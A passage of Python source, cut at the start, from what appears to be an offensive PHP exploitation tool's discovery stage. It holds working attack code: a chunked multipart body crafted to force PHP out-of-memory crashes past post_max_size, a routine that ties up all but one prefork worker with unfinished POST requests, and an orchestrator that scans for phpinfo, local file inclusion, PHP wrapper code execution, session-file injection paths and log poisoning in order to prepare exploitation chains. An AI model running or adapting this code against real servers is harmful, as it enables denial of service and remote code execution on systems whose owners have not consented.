    out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n")
    out.extend(b"k" * 4000 + b"\r\n")
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def probe_oom(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    timeout: float = 30.0,
) -> Dict[str, Any]:
    """Send a chunked multipart POST designed to trigger PHP OOM.

    Returns dict with 'triggered', 'status', 'body_snippet', 'evidence_ref'.
    Uses chunked Transfer-Encoding to bypass post_max_size.
    """
    result: Dict[str, Any] = {
        "triggered": False,
        "status": None,
        "body_snippet": None,
        "evidence_ref": None,
    }
    if not budget.can_spend():
        return result

    body = build_oom_probe_body()
    boundary = "C" * 10
    nonce = new_nonce("P2SOOM")
    headers: Dict[str, str] = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }

    try:
        exchange = client.request(
            "POST", profile.base_url,
            body=body, headers=headers,
            chunked=True, nonce=nonce, timeout=timeout,
        )
    except Exception:
        budget.spend()
        return result

    budget.spend()
    classification = classify(exchange, nonce=nonce)
    item = store.add_http(
        exchange, classification,
        scenario_id="discover-oom-probe",
        trust="medium",
        notes="OOM probe: chunked multipart with nested fields",
    )
    result["evidence_ref"] = item.id
    result["status"] = exchange.status

    body_text = _body_text(exchange)
    if exchange.status == 500 or exchange.status == 502:
        result["triggered"] = True
        if _OOM_DETECT.search(body_text):
            result["body_snippet"] = body_text[:200]
        elif not body_text:
            result["body_snippet"] = "(empty 500 response — likely OOM bailout)"
    elif _OOM_DETECT.search(body_text):
        result["triggered"] = True
        result["body_snippet"] = body_text[:200]

    return result


def hold_workers(
    host: str,
    port: int,
    workers: int,
    timeout: float = 60.0,
) -> List[socket.socket]:
    """Occupy all but one prefork child with incomplete POST bodies.

    Returns the list of held sockets. Caller must close them when done.
    """
    holders: List[socket.socket] = []
    if workers <= 1:
        return holders
    n = workers - 1
    for _ in range(n):
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(b"POST /index.php HTTP/1.1\r\nHost: " + host.encode() + b"\r\n"
                      b"Content-Type: application/x-www-form-urlencoded\r\n"
                      b"Content-Length: 1048576\r\n\r\nx")
            holders.append(s)
        except OSError:
            break
        time.sleep(0.01)
    time.sleep(0.5)
    return holders


def release_workers(holders: List[socket.socket]) -> None:
    for s in holders:
        try:
            s.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Phase 6: framework detection
# ---------------------------------------------------------------------------


def detect_framework(
    profile: TargetProfile,
    homepage_exchange: Optional[HttpExchange] = None,
) -> Tuple[Optional[str], Optional[str]]:
    headers_str = ""
    cookies_str = ""
    body_str = ""

    if homepage_exchange:
        for key, value in (homepage_exchange.response_headers or {}).items():
            headers_str += f"{key}: {value}\n"
            if key.lower() == "set-cookie":
                cookies_str += value + "\n"
        body_str = _body_text(homepage_exchange)

    for signature, location, framework in _FRAMEWORK_SIGNATURES:
        if location == "cookie" and signature.lower() in cookies_str.lower():
            return framework, None
        elif location == "header" and signature.lower() in headers_str.lower():
            return framework, None
        elif location == "body" and signature.lower() in body_str.lower():
            return framework, None

    return None, None


# ---------------------------------------------------------------------------
# Main discovery orchestrator
# ---------------------------------------------------------------------------


def run_discovery(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    max_requests: int = 120,
    timeout: float = 8.0,
    log: Any = None,
) -> DiscoverResult:
    budget = DiscoverBudget(max_requests=max_requests)
    result = DiscoverResult()

    def _log(msg: str) -> None:
        result.notes.append(msg)
        if log:
            log(msg)

    # --- Fetch homepage + detect framework ---
    homepage_exchange = None
    homepage_body = ""
    pair = _safe_get(
        client, profile.base_url, store, budget,
        scenario_id="discover-homepage",
        timeout=timeout,
        notes="homepage fetch for discovery",
    )
    if pair:
        homepage_exchange, item = pair
        homepage_body = _body_text(homepage_exchange)
        result.evidence_refs.append(item.id)

    fw_name, fw_version = detect_framework(profile, homepage_exchange)
    if fw_name:
        result.framework = fw_name
        result.framework_version = fw_version
        _log(f"framework detected: {fw_name}")

    # --- Phase 1: phpinfo ---
    _log("phase 1: scanning for phpinfo")
    result.phpinfo = discover_phpinfo(client, profile, store, budget, timeout)
    if result.phpinfo.found:
        _log(f"phpinfo found at {result.phpinfo.url}")
        if result.phpinfo.session_save_path:
            _log(f"  session.save_path = {result.phpinfo.session_save_path}")
        if result.phpinfo.disable_functions:
            _log(f"  disable_functions = {', '.join(result.phpinfo.disable_functions[:5])}...")
        if result.phpinfo.allow_url_include:
            _log("  allow_url_include = On (wrappers may work)")
        if result.phpinfo.memory_limit:
            _log(f"  memory_limit = {result.phpinfo.memory_limit}")
    else:
        _log("phpinfo not found at common paths")

    # --- Phase 1b: spider one level deep ---
    if budget.can_spend(2):
        _log("phase 1b: spidering for PHP pages")
        crawled = spider_pages(
            client, profile, store, budget, homepage_body, timeout,
        )
        result.crawled_pages = [p for p, _ in crawled]
        if crawled:
            _log(f"  found {len(crawled)} additional pages")
            for page_path, page_body in crawled:
                page_links = _extract_links(profile.base_url, page_body)
                for _, params in page_links:
                    for pname in params:
                        if pname not in result.discovered_params.get(page_path, []):
                            result.discovered_params.setdefault(page_path, []).append(pname)

    # --- Phase 1c: upload_progress.cleanup warning ---
    if result.phpinfo.found:
        if result.phpinfo.upload_progress_cleanup is True:
            _log("  ! session.upload_progress.cleanup=On — race window is narrow for chain A")
        if result.phpinfo.upload_progress_enabled is False:
            _log("  ! session.upload_progress.enabled=Off — session injection will not work")

    # --- Phase 2: LFI discovery ---
    _log("phase 2: scanning for LFI")
    lfi_endpoints = discover_lfi(
        client, profile, store, budget,
        homepage_body=homepage_body,
        timeout=timeout,
    )
    result.lfi_endpoints = lfi_endpoints
    if lfi_endpoints:
        best = lfi_endpoints[0]
        _log(f"LFI found: {best.url} ?{best.param}= (method: {best.method})")
    else:
        _log("no LFI found at common paths/params")

    # --- Phase 3: PHP wrapper test ---
    if lfi_endpoints:
        best_lfi = lfi_endpoints[0]
        _log("phase 3: testing PHP wrappers (data://, php://input)")
        wrapper = test_php_wrappers(
            client, profile, store, budget,
            best_lfi, result.phpinfo, timeout,
        )
        if wrapper:
            result.wrapper_works = wrapper
            _log(f"wrapper execution confirmed: {wrapper}://")
        else:
            _log("PHP wrappers not available (allow_url_include likely Off)")
    else:
        _log("phase 3: skipped (no LFI for wrapper test)")

    # --- Phase 4: session path discovery ---
    if lfi_endpoints and not result.wrapper_works:
        best_lfi = lfi_endpoints[0]
        _log("phase 4: discovering session path")
        sess_path, sess_source = discover_session_path(
            client, profile, store, budget,
            result.phpinfo, best_lfi, timeout,
        )
        if sess_path:
            result.session_path = sess_path
            result.session_path_source = sess_source
            _log(f"session path found: {sess_path} (via {sess_source})")
        else:
            _log("session path not found; chain A/C will use default /tmp/sess_")
            result.session_path = "/tmp/sess_"
            result.session_path_source = "default"
    elif result.phpinfo.session_save_path:
        path = result.phpinfo.session_save_path.rstrip("/")
        result.session_path = f"{path}/sess_"
        result.session_path_source = "phpinfo"
    elif not result.wrapper_works:
        result.session_path = "/tmp/sess_"
        result.session_path_source = "default"

    # --- Phase 5: log poisoning discovery ---
    if lfi_endpoints and not result.wrapper_works and budget.can_spend(2):
        best_lfi = lfi_endpoints[0]
        _log("phase 5: testing log poisoning via LFI")
        log_path, log_ref = discover_log_poisoning(
            client, profile, store, budget, best_lfi, timeout,
        )
        if log_path:
            result.log_poisoning_path = log_path
            result.log_poisoning_log = log_path
            if log_ref:
                result.evidence_refs.append(log_ref)
            _log(f"log poisoning confirmed: {log_path}")
        else:
            _log("no readable log files found via LFI")
    elif lfi_endpoints and result.wrapper_works:
        _log("phase 5: skipped (wrapper execution available, log poisoning unnecessary)")

    # --- Phase 7: OOM probe (Chain D prerequisite) ---
    sapi = getattr(profile, "sapi", None)
    is_mod_php = sapi in ("mod_php", "apache2handler")
    if is_mod_php and budget.can_spend():
        _log("phase 7: probing OOM vulnerability (Chain D prerequisite)")
        oom = probe_oom(client, profile, store, budget, timeout)
        result.oom_vulnerable = oom["triggered"]
        result.oom_status_code = oom["status"]
        result.oom_body_snippet = oom["body_snippet"]
        result.oom_sapi_is_mod_php = True
        if oom["evidence_ref"]:
            result.evidence_refs.append(oom["evidence_ref"])
        if oom["triggered"]:
            _log(f"OOM triggered! status={oom['status']} — Chain D may be viable")
        else:
            _log(f"OOM probe negative (status={oom['status']})")
    elif not is_mod_php and sapi:
        _log(f"phase 7: skipped (SAPI={sapi}, Chain D requires mod_php)")
        result.oom_sapi_is_mod_php = False
    else:
        _log("phase 7: skipped (SAPI unknown)")

    result.allow_url_include = result.phpinfo.allow_url_include
    result.requests_used = budget.used
    _log(f"discovery complete: {budget.used} requests used")

    return result
